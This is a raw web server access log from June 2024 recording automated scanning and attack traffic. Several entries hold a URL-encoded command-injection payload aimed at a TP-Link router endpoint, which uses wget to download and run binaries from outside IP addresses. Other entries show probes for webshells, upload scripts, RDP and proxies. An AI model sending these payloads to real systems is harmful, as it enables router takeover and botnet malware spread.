172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [15/Jun/2024:16:52:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.140.17.52 - - [15/Jun/2024:17:09:14 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
185.191.127.212 - - [15/Jun/2024:17:10:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:17:14:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [15/Jun/2024:17:21:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
3.0.48.183 - - [15/Jun/2024:17:36:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Python-urllib/3.8"
3.0.48.183 - - [15/Jun/2024:17:36:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 5.1; rv:57.0) Gecko/20100101 Firefox/57.0"
3.0.48.183 - - [15/Jun/2024:17:36:11 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:17:40:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.79 - - [15/Jun/2024:17:55:42 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
149.50.103.48 - - [15/Jun/2024:17:59:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.83.64.36 - - [15/Jun/2024:18:02:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
83.143.112.38 - - [15/Jun/2024:18:07:59 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.28.1"
149.50.103.48 - - [15/Jun/2024:18:12:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
80.66.83.49 - - [15/Jun/2024:18:22:27 +0000] "\x04\x01\x00PPBS1\x00" 400 154 "-" "-"
80.66.83.49 - - [15/Jun/2024:18:22:27 +0000] "\x05\x01\x00" 400 154 "-" "-"
80.66.83.49 - - [15/Jun/2024:18:22:27 +0000] "CONNECT 80.66.83.49:80 HTTP/1.1" 400 154 "-" "-"
46.19.143.66 - - [15/Jun/2024:18:36:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:18:38:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:18:40:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.224.128.43 - - [15/Jun/2024:18:49:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.38.111.110 - - [15/Jun/2024:18:52:17 +0000] "GET / HTTP/1.0" 301 166 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
149.50.103.48 - - [15/Jun/2024:19:02:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
34.22.213.78 - - [15/Jun/2024:19:05:21 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.32.2"
185.244.36.200 - - [15/Jun/2024:19:10:19 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
45.148.10.174 - - [15/Jun/2024:19:11:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:19:14:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:19:24:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:19:40:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.128.232.174 - - [15/Jun/2024:19:42:29 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F93.123.85.128%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
58.49.233.126 - - [15/Jun/2024:19:45:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
154.51.131.142 - - [15/Jun/2024:19:45:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
46.19.143.66 - - [15/Jun/2024:19:48:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.41 - - [15/Jun/2024:19:51:13 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [15/Jun/2024:19:57:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:20:02:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:20:22:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
84.54.51.37 - - [15/Jun/2024:20:29:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.83%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:20:36:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
57.151.49.60 - - [15/Jun/2024:20:42:45 +0000] "GET /druid/index.html HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
199.45.155.51 - - [15/Jun/2024:20:44:35 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.155.51 - - [15/Jun/2024:20:44:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.51 - - [15/Jun/2024:20:44:47 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
51.8.222.152 - - [15/Jun/2024:20:47:04 +0000] "GET /hudson HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
104.152.52.32 - - [15/Jun/2024:20:47:54 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
185.224.128.43 - - [15/Jun/2024:20:50:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.92.245.111 - - [15/Jun/2024:20:51:19 +0000] "GET /wp-content/plugins/WordPressCore/include.php HTTP/1.1" 301 166 "www.google.com" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
149.50.103.48 - - [15/Jun/2024:20:57:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
170.106.82.193 - - [15/Jun/2024:20:59:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
46.19.143.66 - - [15/Jun/2024:21:00:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
167.94.145.102 - - [15/Jun/2024:21:05:08 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
167.94.145.102 - - [15/Jun/2024:21:05:18 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
149.50.103.48 - - [15/Jun/2024:21:18:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
194.38.23.16 - - [15/Jun/2024:21:30:28 +0000] "GET /assets/global/plugins/plupload/examples/upload.php HTTP/1.1" 301 166 "-" "ALittle Client"
194.38.23.16 - - [15/Jun/2024:21:30:29 +0000] "GET /public/assets/plugins/plupload/examples/upload.php HTTP/1.1" 301 166 "-" "ALittle Client"
194.38.23.16 - - [15/Jun/2024:21:30:29 +0000] "GET /admin/assets/plugins/plupload/examples/upload.php HTTP/1.1" 301 166 "-" "ALittle Client"
223.15.245.170 - - [15/Jun/2024:21:32:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.103.48 - - [15/Jun/2024:21:38:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
80.82.70.133 - - [15/Jun/2024:21:51:05 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0"
185.191.127.212 - - [15/Jun/2024:21:52:00 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
179.43.161.135 - - [15/Jun/2024:21:59:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:22:02:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [15/Jun/2024:22:13:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.87.104.242 - - [15/Jun/2024:22:14:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"
149.50.103.48 - - [15/Jun/2024:22:21:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.218.54.174 - - [15/Jun/2024:22:28:53 +0000] "HEAD / HTTP/1.1" 301 0 "-" "-"
104.218.54.174 - - [15/Jun/2024:22:28:53 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [15/Jun/2024:22:40:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [15/Jun/2024:22:49:37 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.128.232.200 - - [15/Jun/2024:22:49:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.200 - - [15/Jun/2024:22:49:40 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [15/Jun/2024:22:57:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:23:12:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
162.142.125.205 - - [15/Jun/2024:23:26:02 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
162.142.125.205 - - [15/Jun/2024:23:26:15 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
46.19.143.66 - - [15/Jun/2024:23:30:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [15/Jun/2024:23:34:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [15/Jun/2024:23:44:29 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.127.212 - - [15/Jun/2024:23:49:31 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [15/Jun/2024:23:58:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [16/Jun/2024:00:17:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
135.148.195.15 - - [16/Jun/2024:00:28:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0"
198.235.24.126 - - [16/Jun/2024:00:28:42 +0000] "GET / HTTP/1.0" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
34.132.182.154 - - [16/Jun/2024:00:34:05 +0000] "GET / HTTP/1.1" 301 166 "-" "\x5C'Mozilla/5.0"
149.50.103.48 - - [16/Jun/2024:00:36:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
115.231.78.12 - - [16/Jun/2024:00:37:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
115.231.78.12 - - [16/Jun/2024:00:38:28 +0000] "GET /assets/img/favicon/another/favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.12 - - [16/Jun/2024:00:38:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.12 - - [16/Jun/2024:00:38:32 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
84.54.51.37 - - [16/Jun/2024:00:43:07 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.83%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
46.19.143.66 - - [16/Jun/2024:00:43:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [16/Jun/2024:00:48:44 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [16/Jun/2024:01:02:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [16/Jun/2024:01:23:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
15.204.182.106 - - [16/Jun/2024:01:35:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
149.50.103.48 - - [16/Jun/2024:01:42:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
205.210.31.177 - - [16/Jun/2024:01:49:05 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [16/Jun/2024:01:55:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
43.155.166.202 - - [16/Jun/2024:01:56:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
46.19.143.66 - - [16/Jun/2024:01:56:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
198.235.24.154 - - [16/Jun/2024:02:08:49 +0000] "GET /lab? HTTP/1.1" 301 166 "http://180.233.121.154:80/" "-"
185.224.128.43 - - [16/Jun/2024:02:14:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
58.53.218.148 - - [16/Jun/2024:02:21:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
147.185.132.186 - - [16/Jun/2024:02:22:25 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03X\x044:-q\x15\x1D\xF9\xF0\xD3\xA1+`\xD4\x14\x07\xD3\xCF\x82\x07\xE3\xA3\x95x(\xCF\x07?}\xC0\xF9 \xACL*xf\x12N\x9A%\x14\xE0\xB7X\xCF\xD3\x0EZ0\x07\x08\xFA\x1Fx\x9E\xDB\xEF\x19\x82\x088\xE2{\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
147.185.132.186 - - [16/Jun/2024:02:22:25 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x9F\xDA\x00\xA6\x1A\xD4\xCC8\xC2\x9F\xF1a\xBAsQ\xDC\xF7\x8B q\x85V\xFB\xDB\x948\xA8\xBB\xE0\xAB,y\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
149.50.103.48 - - [16/Jun/2024:02:23:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [16/Jun/2024:02:25:25 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [16/Jun/2024:02:39:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
80.82.70.133 - - [16/Jun/2024:02:44:37 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 154 "-" "-"
149.50.103.48 - - [16/Jun/2024:02:54:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
152.42.249.227 - - [16/Jun/2024:03:02:10 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x88\x12\xC8\x02\xDBX6\x80" 400 154 "-" "-"
152.42.249.227 - - [16/Jun/2024:03:02:10 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03c-d\xAC\xE5\x1B\xEE\x84P\x1DQ5\x89\x9Bi\x92+\xBCX{7\xE0\xD1w\xE0D\xB6\x12LY\xD9\x89\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
152.42.249.227 - - [16/Jun/2024:03:02:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:10 +0000] "GET /form.html HTTP/1.1" 301 166 "-" "curl/8.1.2"
152.42.249.227 - - [16/Jun/2024:03:02:10 +0000] "GET /upl.php HTTP/1.1" 301 166 "-" "Mozilla/5.0"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xAF\xCD\x02y%\x11e\xDFcVh c\xA8Y\xE0\xA1\xBB\xD1kz}\xC4,\x98\xB5\xAERZ\xC4\x8F\x9F\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "GET /geoip/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "GET /1.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "GET /bundle.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "GET /files/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "GET /systembc/password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:11 +0000] "GET /password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.42.249.227 - - [16/Jun/2024:03:02:12 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.19.143.66 - - [16/Jun/2024:03:08:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
